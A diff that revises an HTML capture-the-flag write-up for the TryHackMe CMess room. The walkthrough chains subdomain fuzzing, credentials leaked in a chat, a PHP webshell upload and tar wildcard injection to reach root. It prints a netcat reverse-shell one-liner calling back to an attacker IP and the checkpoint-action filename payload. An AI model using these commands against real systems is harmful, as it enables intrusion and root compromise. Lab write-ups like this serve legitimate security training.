@@ -18,11 +18,12 @@
   <div class="meta-row">
     <span class="pill">Room: CMess (Gila CMS)</span>
     <span class="pill">Category: Web / Linux Privesc</span>
-    <span class="pill">Tools: Gobuster, ffuf</span>
+    <span class="pill">Tools: nmap, wfuzz, tar wildcard injection</span>
   </div>
 
   <div class="brief">
-    <p><strong>The setup:</strong> a Gila CMS install with a support feature that logs more than it should, and a cron job that trusts filenames it shouldn't. The job: find the leaked credentials, get code execution through the admin panel, and abuse the cron job's own tar command to become root.</p>
+    <p><strong>The setup:</strong> a Gila CMS instance at <code>cmess.thm</code>, nothing else to go on but a hostname. The job: find the real attack surface, get in, and chain it to root.</p>
+    <p>No single flag in these notes, the target is a root shell.</p>
   </div>
 
   <section>
@@ -32,12 +33,20 @@
       <div class="step">
         <div class="step-num">1</div>
         <div class="step-body">
-          <div class="step-title">Fuzz for the real subdomain</div>
-          <p>The base site is mostly static, but subdomain fuzzing against the target's domain turns up a separate host running the actual Gila CMS application.</p>
-          <pre><code>ffuf -u http://FUZZ.&lt;domain&gt; -H "Host: FUZZ.&lt;domain&gt;" -w /usr/share/wordlists/subdomains.txt</code></pre>
+          <div class="step-title">Scan the host and identify the CMS</div>
+          <pre><code>nmap -sV -sC cmess.thm
+
+Nmap scan report for cmess.thm (10.10.92.204)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-generator: Gila CMS
+| http-robots.txt: 3 disallowed entries
+|_/src/ /themes/ /lib/
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Organizations often spin up a CMS or admin panel on a subdomain they don't link to from the main site. DNS/vhost fuzzing finds what a crawler never will.</p>
+            <p>nmap's <code>http-generator</code> script fingerprints the CMS directly from the page metadata, no guessing needed before moving on to platform-specific research.</p>
           </div>
         </div>
       </div>
@@ -45,11 +54,32 @@
       <div class="step">
         <div class="step-num">2</div>
         <div class="step-body">
-          <div class="step-title">Find leaked credentials in a support chat</div>
-          <p>The CMS has a live-chat/support widget, and its transcript history is browsable without authentication. Buried in an old conversation, a staff member pastes their own admin username and password while troubleshooting with a colleague.</p>
+          <div class="step-title">Fuzz for a hidden subdomain</div>
+          <pre><code>wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  -u http://cmess.thm -H "Host:FUZZ.cmess.thm" --hw 290
+
+ID           Response   Lines    Word     Chars       Payload
+000000019:   200        30 L     104 W    934 Ch      "dev"</code></pre>
+          <p>Adding <code>dev.cmess.thm</code> to <code>/etc/hosts</code> alongside the main domain and loading it turns up a "Development" page containing a support chat transcript, visible without authentication:</p>
+          <pre><code>andre@cmess.thm:
+Have you guys fixed the bug that was found on live?
+
+support@cmess.thm:
+Hey Andre, We have managed to fix the misconfigured .htaccess file,
+we're hoping to patch it in the upcoming patch!
+
+support@cmess.thm:
+Update! We have had to delay the patch due to unforeseen circumstances
+
+andre@cmess.thm:
+That's ok, can you guys reset my password if you get a moment, I seem
+to be unable to get onto the admin panel.
+
+support@cmess.thm:
+Your password has been reset. Here: KPFTN_f2yxe%</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Support and chat logs are a chronically underestimated leak source. People paste credentials into "private" conversations assuming no one else will ever read them, but if the transcript is stored and reachable, it's just another file to find.</p>
+            <p>A `--hw` (hide words) filter in wfuzz suppresses the default "not found" response size so only genuinely different responses, real subdomains, survive the noise. A dev subdomain is exactly the kind of place internal debugging artifacts like a support transcript get left exposed.</p>
           </div>
         </div>
       </div>
@@ -57,11 +87,16 @@
       <div class="step">
         <div class="step-num">3</div>
         <div class="step-body">
-          <div class="step-title">Upload a webshell through the admin file manager</div>
-          <p>Logged into the Gila CMS admin panel, the built-in file manager accepts a <code>.php</code> upload with no content-type or extension filtering. Dropping a simple PHP web shell and requesting it directly executes commands on the server.</p>
+          <div class="step-title">Log in and upload a webshell through the file manager</div>
+          <p>The leaked credentials (<code>andre</code> / <code>KPFTN_f2yxe%</code>) log straight into <code>cmess.thm/login</code>, and the account turns out to have admin rights. Gila CMS's admin panel has a built-in <strong>Content &rarr; File Manager</strong>, which uploads arbitrary files, PHP included, with no filtering. A PHP reverse shell uploaded there and loaded directly in the browser (<code>cmess.thm/tmp/rev.php</code>) executes on the server:</p>
+          <pre><code>nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.2.57.21] from (UNKNOWN) [10.10.192.161] 51680
+Linux cmess 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>An authenticated file-upload feature in a CMS admin panel is a code-execution primitive by default unless it explicitly restricts extensions and validates content. "Admin can upload files" quietly means "admin can upload a shell" far more often than CMS vendors intend.</p>
+            <p>Leaked credentials and admin rights are two separate findings, the chat leak alone is useless without also confirming the account can reach the file manager. Once both line up, an unrestricted file upload inside an admin panel is remote code execution with extra steps.</p>
           </div>
         </div>
       </div>
@@ -69,12 +104,24 @@
       <div class="step">
         <div class="step-num">4</div>
         <div class="step-body">
-          <div class="step-title">Spot a cron job archiving a world-writable directory</div>
-          <p>Enumeration on the box turns up a cron job running as root that periodically runs <code>tar</code> with a wildcard over a directory the low-privilege web user can write to:</p>
-          <pre><code>tar -czf /backup.tar.gz *</code></pre>
+          <div class="step-title">Find a second credential sitting in /opt</div>
+          <pre><code>www-data@cmess:/opt$ ls -la
+total 12
+drwxr-xr-x  2 root root 4096 Feb  6  2020 .
+drwxr-xr-x 22 root root 4096 Feb  6  2020 ..
+-rwxrwxrwx  1 root root   36 Feb  6  2020 .password.bak
+
+www-data@cmess:/opt$ cat .password.bak
+andres backup password
+UQfsdCB7aP6</code></pre>
+          <p>That password gets a proper interactive shell over SSH as <code>andre</code>:</p>
+          <pre><code>ssh andre@10.10.192.161
+andre@10.10.192.161's password: UQfsdCB7aP6
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)
+andre@cmess:~$</code></pre>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>Shell wildcard expansion happens before the command runs, and <code>tar</code> treats certain filenames starting with a dash as command-line flags, not filenames. Any writable directory feeding a wildcard into tar (or similar tools) is a known, well-documented privilege-escalation pattern.</p>
+            <p>A world-readable backup credential file in <code>/opt</code> is the kind of leftover that survives long after whatever process created it is forgotten. The webshell foothold as <code>www-data</code> is just a stepping stone to find exactly this.</p>
           </div>
         </div>
       </div>
@@ -82,15 +129,47 @@
       <div class="step">
         <div class="step-num">5</div>
         <div class="step-body">
-          <div class="step-title">Exploit the tar wildcard for root</div>
-          <p>Dropping specially-named files into that writable directory, filenames crafted to be interpreted by <code>tar</code> as its own checkpoint/exec flags, smuggles an arbitrary command into the next cron run, executed as root:</p>
-          <pre><code>echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' &gt; shell.sh
-touch -- "--checkpoint=1"
-touch -- "--checkpoint-action=exec=sh shell.sh"</code></pre>
-          <p>On the cron's next run, <code>tar</code> parses those filenames as options instead of archive members and executes the script as root, leaving behind a SUID root shell.</p>
+          <div class="step-title">Spot the wildcard in a root cron job</div>
+          <pre><code>andre@cmess:~$ cat /etc/crontab
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+*/2 * * * * root  cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *</code></pre>
+          <p>That job runs <code>tar</code> with a bare <code>*</code> wildcard inside a directory andre controls, a well-known privilege escalation pattern (<a href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/" target="_blank" rel="noopener">reference</a>).</p>
           <div class="notebook">
             <span class="tag">Why this works</span>
-            <p>This is the classic GTFOBins tar wildcard technique: because <code>tar *</code> expands to every filename in the directory, including attacker-chosen ones, and tar's own checkpoint/exec flags can trigger arbitrary commands, a world-writable directory plus a wildcard tar invocation is effectively a root shell waiting to be claimed.</p>
+            <p>Shell wildcard expansion happens before the command runs, so a filename crafted to look like a <code>tar</code> flag gets interpreted as one. Anyone who can write files into the directory a root-owned wildcard command targets can smuggle in arguments <code>tar</code> was never meant to receive from an untrusted source.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">6</div>
+        <div class="step-body">
+          <div class="step-title">Weaponize the wildcard for a root shell</div>
+          <pre><code>andre@cmess:~/backup$ ls -la
+total 12
+drwxr-x--- 2 andre andre 4096 Feb  9  2020 .
+drwxr-x--- 4 andre andre 4096 Feb  9  2020 ..
+-rwxr-x--- 1 andre andre   51 Feb  9  2020 note
+
+andre@cmess:~/backup$ cat note
+Note to self.
+Anything in here will be backed up!
+
+andre@cmess:~/backup$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.2.57.21 4444 >/tmp/f' > shell.sh
+andre@cmess:~/backup$ chmod +x shell.sh
+andre@cmess:~/backup$ echo "" > "--checkpoint-action=exec=sh shell.sh"
+andre@cmess:~/backup$ echo "" > "--checkpoint=1"</code></pre>
+          <p>GNU tar's <code>--checkpoint</code>/<code>--checkpoint-action</code> flags, smuggled in as filenames the wildcard expands, make <code>tar</code> execute <code>shell.sh</code> partway through the archive it's building. Two minutes later, when the cron fires as root:</p>
+          <pre><code>nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.2.57.21] from (UNKNOWN) [10.10.192.161] 51702
+root@cmess:/home/andre/backup#</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p><code>--checkpoint=1</code> makes tar run the checkpoint action after the first file, and <code>--checkpoint-action=exec=sh shell.sh</code> tells it what to run, both passed in purely as filenames the root-owned <code>tar *</code> picks up and expands as flags. The result: root executes andre's script on a schedule he doesn't control the timing of, but fully controls the content of.</p>
           </div>
         </div>
       </div>
@@ -100,33 +179,50 @@ touch -- "--checkpoint-action=exec=sh shell.sh"</code></pre>
 
   <section>
     <h2 class="section-title">Full Attack Chain</h2>
-    <pre><code>ffuf: hidden Gila CMS subdomain found
-  &rarr; support chat transcript: admin credentials leaked in plain text
-       &rarr; admin file manager: PHP webshell uploaded
-            &rarr; enumeration: root cron job running tar with a wildcard
-                 &rarr; crafted filenames smuggle a command into tar's own flags
-                      &rarr; SUID root shell dropped on the next cron run</code></pre>
+    <pre><code>nmap: Gila CMS on cmess.thm
+  &rarr; wfuzz: dev.cmess.thm found
+       &rarr; support chat transcript leaks andre's reset password
+            &rarr; login as andre, admin rights confirmed
+                 &rarr; File Manager: PHP webshell uploaded and executed (www-data)
+                      &rarr; /opt/.password.bak: a second password for andre
+                           &rarr; SSH as andre
+                                &rarr; /etc/crontab: root tar job with a bare wildcard
+                                     &rarr; checkpoint-action filenames planted
+                                          &rarr; cron fires as root, shell.sh runs: root</code></pre>
+  </section>
+
+  <section>
+    <h2 class="section-title">Tools Used</h2>
+    <div class="ref-wrap">
+      <table class="ref">
+        <tr><th>Tool</th><th>Purpose</th></tr>
+        <tr><td>nmap</td><td>Service scan and Gila CMS fingerprinting via the generator meta tag</td></tr>
+        <tr><td>wfuzz</td><td>Subdomain discovery against the Host header</td></tr>
+        <tr><td>Gila CMS File Manager</td><td>Unrestricted PHP upload once authenticated as admin</td></tr>
+        <tr><td>tar wildcard injection</td><td>Privilege escalation via a root cron job's unquoted <code>*</code></td></tr>
+      </table>
+    </div>
   </section>
 
   <section>
     <h2 class="section-title">Takeaways</h2>
     <div class="skills">
       <div class="skill">
-        <div class="skill-title">Support logs are an underrated credential leak source</div>
-        <p>Any stored transcript, chat log, or ticket history is worth checking for pasted secrets, people treat them as private when they often aren't.</p>
+        <div class="skill-title">Dev subdomains leak what production hides</div>
+        <p>A support chat transcript sitting on an unauthenticated dev subdomain handed over working admin credentials without a single exploit.</p>
       </div>
       <div class="skill">
-        <div class="skill-title">File managers are upload-based RCE unless proven otherwise</div>
-        <p>An admin panel's file upload feature should always be tested for extension and content-type enforcement, not assumed safe because it's "just for images."</p>
+        <div class="skill-title">An admin file manager is a file upload vulnerability by design</div>
+        <p>Once authenticated, Gila CMS's File Manager places no real restriction on what gets uploaded or where, turning a leaked password straight into code execution.</p>
       </div>
       <div class="skill">
-        <div class="skill-title">Wildcards in privileged shell commands are dangerous</div>
-        <p><code>tar</code>, <code>chown</code>, <code>rsync</code>, and several other common tools interpret certain filenames as flags. A root cron job expanding a wildcard over a writable directory is a well-known, reliable privesc path.</p>
+        <div class="skill-title">Wildcard expansion in privileged scripts is a classic, recurring bug</div>
+        <p>Any root-owned command that runs <code>*</code> inside a directory a lower-privileged user can write to is one crafted filename away from argument injection, regardless of which binary it is.</p>
       </div>
     </div>
   </section>
 
-  <footer>tryhackme.com &middot; solved via credential leakage, webshell upload, and a tar wildcard injection</footer>
+  <footer>tryhackme.com &middot; solved via leaked-credential chaining and a tar wildcard privesc</footer>
 
 </div>
 </body>
